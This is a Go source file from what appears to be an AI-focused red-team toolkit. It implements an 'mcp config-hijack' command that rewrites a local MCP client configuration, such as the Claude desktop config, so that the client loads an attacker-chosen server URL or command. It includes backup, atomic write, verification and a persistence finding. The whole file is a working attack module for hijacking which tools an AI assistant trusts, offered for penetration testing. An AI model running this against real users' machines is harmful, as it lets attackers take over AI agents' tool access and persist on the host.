package main

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"

	"github.com/spf13/cobra"

	"github.com/professor-moody/aipostex/pkg/exploit/mcp"
	"github.com/professor-moody/aipostex/pkg/report"
)

var mcpConfigHijackCmd = &cobra.Command{
	Use:   "config-hijack",
	Short: "Write a hijacked MCP server entry into a local config",
	Long: `Write or replace one server entry in a local MCP configuration file.

The original config is backed up first, the modified config is reloaded through
the MCP config parser, and verification failure restores the original bytes.

This is an active local-state mutation and requires --force-exploit.`,
	Example: strings.Join([]string{
		formatCommandExample("mcp config-hijack --config ./claude_desktop_config.json --server aipostex-hijack --url http://127.0.0.1:3000/mcp --force-exploit"),
		formatCommandExample("mcp config-hijack --config ./claude_desktop_config.json --server aipostex-hijack --command npx --arg @modelcontextprotocol/server-filesystem --arg /tmp --force-exploit"),
	}, "\n"),
	RunE: runMCPConfigHijack,
}

func runMCPConfigHijack(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("mcp config-hijack"); err != nil {
		return err
	}
	if strings.TrimSpace(mcpConfig) == "" {
		return missingFlagError("config", formatCommandExample("mcp config-hijack --config ~/.config/Claude/claude_desktop_config.json --url http://127.0.0.1:3000/mcp --force-exploit"))
	}
	serverName := strings.TrimSpace(mcpHijackServer)
	if serverName == "" {
		return missingFlagError("server", formatCommandExample("mcp config-hijack --config ./mcp.json --server aipostex-hijack --url http://127.0.0.1:3000/mcp --force-exploit"))
	}

	hijackURL := strings.TrimSpace(mcpHijackURL)
	hijackCommand := strings.TrimSpace(mcpHijackCommand)
	if (hijackURL == "") == (hijackCommand == "") {
		return fmt.Errorf("set exactly one of --url or --command")
	}

	env, err := parseMCPHijackEnv(mcpHijackEnv)
	if err != nil {
		return err
	}
	transport := inferMCPHijackTransport(hijackURL, hijackCommand, mcpHijackTransport)
	entry := buildMCPHijackEntry(hijackURL, hijackCommand, mcpHijackArgs, env, transport)

	configPath := filepath.Clean(mcpConfig)
	original, err := os.ReadFile(configPath)
	if err != nil {
		return fmt.Errorf("reading MCP config: %w", err)
	}
	info, err := os.Stat(configPath)
	if err != nil {
		return fmt.Errorf("stating MCP config: %w", err)
	}

	var root map[string]interface{}
	if err := json.Unmarshal(original, &root); err != nil {
		return fmt.Errorf("parsing MCP config JSON: %w", err)
	}
	if root == nil {
		root = make(map[string]interface{})
	}

	layout, replaced, err := upsertMCPConfigServerEntry(root, serverName, entry)
	if err != nil {
		return err
	}
	modified, err := json.MarshalIndent(root, "", "  ")
	if err != nil {
		return fmt.Errorf("encoding modified MCP config: %w", err)
	}
	modified = append(modified, '\n')

	stamp := time.Now().UTC().Format("20060102T150405.000000000Z")
	backupPath := configPath + ".aipostex-bak-" + stamp
	// #nosec G703 -- config-hijack is a gated local config mutation; backupPath is derived from the explicit --config path.
	if err := os.WriteFile(backupPath, original, 0o600); err != nil {
		return fmt.Errorf("writing MCP config backup: %w", err)
	}

	writeMode := ownerOnlyConfigMode(info.Mode().Perm())
	if err := writeFileAtomically(configPath, modified, writeMode, stamp); err != nil {
		return fmt.Errorf("writing modified MCP config: %w", err)
	}

	verifiedServer, err := verifyMCPHijackConfig(configPath, serverName, hijackURL, hijackCommand, mcpHijackArgs, env, transport)
	if err != nil {
		// #nosec G703 -- restoring the explicit --config path is the rollback path for this gated mutation.
		if restoreErr := os.WriteFile(configPath, original, info.Mode().Perm()); restoreErr != nil {
			return fmt.Errorf("verifying modified MCP config: %w; restoring original failed: %v", err, restoreErr)
		}
		return fmt.Errorf("verifying modified MCP config: %w; original restored from memory and backup remains at %s", err, backupPath)
	}

	plan := buildMCPConfigHijackWorkflowPlan(configPath, hijackURL, hijackCommand, mcpHijackArgs)
	finding := newExploitFinding(
		report.SourceMCP,
		configPath,
		fmt.Sprintf("MCP config hijack written: %s", serverName),
		report.SeverityHigh,
		fmt.Sprintf("Wrote and verified MCP config entry %s with %s transport", serverName, verifiedServer.Transport),
		map[string]interface{}{
			"module":        "mcp",
			"action":        "config-hijack",
			"mutating":      true,
			"provider":      "mcp",
			"config_source": configPath,
			"server":        serverName,
			"transport":     verifiedServer.Transport,
			"command":       verifiedServer.Command,
			"url":           verifiedServer.URL,
			"args_count":    len(verifiedServer.Args),
			"env_keys":      joinPreview(sortedKeys(verifiedServer.Env), 10),
			"backup_path":   backupPath,
			"verified":      true,
			"replaced":      replaced,
			"layout":        layout,
		},
	)
	finding.Metadata = applyStageLanded(finding.Metadata, "impact", "influenced", "mcp-config-hijack", "config-persistence")
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, plan)
	finding.Evidence = mcpConfigHijackEvidence(serverName, backupPath, layout, entry)

	infof("Wrote MCP config entry %s and verified parser reload", serverName)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "mcp",
		Action:              "config-hijack",
		ResourcesEnumerated: 1,
		PartialFailures:     0,
		Mutating:            true,
		WorkflowPlans:       []workflowPlan{plan},
	})
}

func parseMCPHijackEnv(values []string) (map[string]string, error) {
	out := make(map[string]string)
	for _, raw := range values {
		key, value, ok := strings.Cut(raw, "=")
		key = strings.TrimSpace(key)
		if !ok || key == "" {
			return nil, fmt.Errorf("invalid --env %q; expected KEY=VALUE", raw)
		}
		out[key] = value
	}
	return out, nil
}

func inferMCPHijackTransport(rawURL, command, explicit string) string {
	if transport := strings.TrimSpace(explicit); transport != "" {
		return transport
	}
	if strings.TrimSpace(command) != "" {
		return "stdio"
	}
	return mcp.InferTransport(rawURL)
}

func buildMCPHijackEntry(rawURL, command string, args []string, env map[string]string, transport string) map[string]interface{} {
	entry := map[string]interface{}{
		"transport": transport,
	}
	if strings.TrimSpace(rawURL) != "" {
		entry["url"] = strings.TrimSpace(rawURL)
	}
	if strings.TrimSpace(command) != "" {
		entry["command"] = strings.TrimSpace(command)
	}
	if len(args) > 0 {
		entry["args"] = append([]string(nil), args...)
	}
	if len(env) > 0 {
		entry["env"] = env
	}
	return entry
}

func upsertMCPConfigServerEntry(root map[string]interface{}, server string, entry map[string]interface{}) (string, bool, error) {
	for _, key := range []string{"mcpServers", "servers"} {
		if raw, ok := root[key]; ok {
			next, replaced, err := upsertMCPServerContainer(raw, server, entry)
			if err != nil {
				return "", false, fmt.Errorf("updating %s: %w", key, err)
			}
			root[key] = next
			return key, replaced, nil
		}
	}

	if raw, ok := root["mcp"]; ok {
		nested, ok := raw.(map[string]interface{})
		if !ok {
			return "", false, fmt.Errorf("updating mcp: expected object")
		}
		for _, key := range []string{"mcpServers", "servers"} {
			if child, ok := nested[key]; ok {
				next, replaced, err := upsertMCPServerContainer(child, server, entry)
				if err != nil {
					return "", false, fmt.Errorf("updating mcp.%s: %w", key, err)
				}
				nested[key] = next
				root["mcp"] = nested
				return "mcp." + key, replaced, nil
			}
		}
	}

	for _, key := range []string{"mcp.servers", "mcp.mcpServers"} {
		if raw, ok := root[key]; ok {
			next, replaced, err := upsertMCPServerContainer(raw, server, entry)
			if err != nil {
				return "", false, fmt.Errorf("updating %s: %w", key, err)
			}
			root[key] = next
			return key, replaced, nil
		}
	}

	if looksLikeMCPServerEntryMap(root) {
		_, replaced := root[server]
		root[server] = entry
		return "root", replaced, nil
	}

	if raw, ok := root["mcp"]; ok {
		nested := raw.(map[string]interface{})
		nested["mcpServers"] = map[string]interface{}{server: entry}
		root["mcp"] = nested
		return "mcp.mcpServers", false, nil
	}

	root["mcpServers"] = map[string]interface{}{server: entry}
	return "mcpServers", false, nil
}

func upsertMCPServerContainer(raw interface{}, server string, entry map[string]interface{}) (interface{}, bool, error) {
	switch container := raw.(type) {
	case map[string]interface{}:
		_, replaced := container[server]
		container[server] = entry
		return container, replaced, nil
	case []interface{}:
		nextEntry := map[string]interface{}{"name": server}
		for key, value := range entry {
			nextEntry[key] = value
		}
		for i, item := range container {
			itemMap, ok := item.(map[string]interface{})
			if !ok {
				continue
			}
			if name, ok := itemMap["name"].(string); ok && name == server {
				container[i] = nextEntry
				return container, true, nil
			}
		}
		container = append(container, nextEntry)
		return container, false, nil
	default:
		return nil, false, fmt.Errorf("expected object or array, got %T", raw)
	}
}

func looksLikeMCPServerEntryMap(root map[string]interface{}) bool {
	if len(root) == 0 {
		return false
	}
	for _, raw := range root {
		entry, ok := raw.(map[string]interface{})
		if !ok {
			return false
		}
		if !hasAnyMCPServerEntryKey(entry, "command", "url", "transport", "env", "environment", "args", "tools") {
			return false
		}
	}
	return true
}

func hasAnyMCPServerEntryKey(entry map[string]interface{}, keys ...string) bool {
	for _, key := range keys {
		if _, ok := entry[key]; ok {
			return true
		}
	}
	return false
}

func ownerOnlyConfigMode(mode os.FileMode) os.FileMode {
	if mode == 0 || mode&0o077 != 0 {
		return 0o600
	}
	return mode
}

func writeFileAtomically(path string, data []byte, mode os.FileMode, stamp string) error {
	tmpPath := filepath.Join(filepath.Dir(path), "."+filepath.Base(path)+".aipostex-tmp-"+stamp)
	if err := os.WriteFile(tmpPath, data, mode); err != nil {
		return err
	}
	if err := os.Rename(tmpPath, path); err != nil {
		_ = os.Remove(tmpPath)
		return err
	}
	return os.Chmod(path, mode)
}

func verifyMCPHijackConfig(path, server, rawURL, command string, args []string, env map[string]string, transport string) (mcp.LocalServer, error) {
	servers, err := mcp.LoadConfig(path)
	if err != nil {
		return mcp.LocalServer{}, err
	}
	for _, candidate := range servers {
		if candidate.Name != server {
			continue
		}
		if strings.TrimSpace(rawURL) != "" && candidate.URL != strings.TrimSpace(rawURL) {
			return candidate, fmt.Errorf("server %q URL mismatch: got %q want %q", server, candidate.URL, rawURL)
		}
		if strings.TrimSpace(command) != "" && candidate.Command != strings.TrimSpace(command) {
			return candidate, fmt.Errorf("server %q command mismatch: got %q want %q", server, candidate.Command, command)
		}
		if strings.TrimSpace(transport) != "" && candidate.Transport != strings.TrimSpace(transport) {
			return candidate, fmt.Errorf("server %q transport mismatch: got %q want %q", server, candidate.Transport, transport)
		}
		if !sameStringSet(candidate.Args, args) {
			return candidate, fmt.Errorf("server %q args mismatch: got %v want %v", server, candidate.Args, args)
		}
		for key, value := range env {
			if candidate.Env[key] != value {
				return candidate, fmt.Errorf("server %q env %s mismatch", server, key)
			}
		}
		return candidate, nil
	}
	return mcp.LocalServer{}, fmt.Errorf("server %q not found after write", server)
}

func sameStringSet(a, b []string) bool {
	left := uniqueSortedStrings(a)
	right := uniqueSortedStrings(b)
	if len(left) != len(right) {
		return false
	}
	for i := range left {
		if left[i] != right[i] {
			return false
		}
	}
	return true
}

func mcpConfigHijackEvidence(server, backupPath, layout string, entry map[string]interface{}) string {
	keys := make([]string, 0, len(entry))
	for key := range entry {
		keys = append(keys, key)
	}
	sort.Strings(keys)

	ordered := make(map[string]interface{}, len(entry))
	for _, key := range keys {
		ordered[key] = entry[key]
	}
	raw, err := json.MarshalIndent(ordered, "", "  ")
	if err != nil {
		raw = []byte(fmt.Sprintf("%v", entry))
	}
	return fmt.Sprintf("server=%s\nlayout=%s\nbackup=%s\nentry=%s", server, layout, backupPath, string(raw))
}

func buildMCPConfigHijackWorkflowPlan(configPath, rawURL, command string, args []string) workflowPlan {
	recs := []workflowRecommendation{
		newWorkflowRecommendation(
			formatCommandExample("mcp analyze --config "+shellSafeArg(configPath)),
			"Re-analyze the modified config to confirm the new entry appears in the same local MCP inventory.",
			false,
			10,
		),
	}
	target := configPath
	if strings.TrimSpace(rawURL) != "" {
		target = strings.TrimSpace(rawURL)
		recs = append(recs, newWorkflowRecommendation(
			formatCommandExample("mcp --target "+shellSafeArg(rawURL)+" enum"),
			"Enumerate the remote MCP endpoint now referenced by the hijacked config entry.",
			false,
			20,
		))
	} else if strings.TrimSpace(command) != "" {
		stdioCommand := "mcp --transport stdio --stdio-command " + shellSafeArg(command)
		if len(args) > 0 {
			stdioCommand += " --stdio-args " + shellSafeArg(strings.Join(args, ","))
		}
		stdioCommand += " enum"
		recs = append(recs, newWorkflowRecommendation(
			formatCommandExample(stdioCommand),
			"Start and enumerate the local stdio MCP server referenced by the hijacked config entry.",
			false,
			20,
		))
	}

	return workflowPlan{
		Target:          target,
		Stage:           "impact",
		Landed:          "influenced",
		ChainSource:     "mcp-config-hijack",
		Rationale:       "The local config was modified and reparsed, so the next step is confirming the entry through analyze and enumerating the referenced MCP server.",
		Recommendations: recs,
	}
}
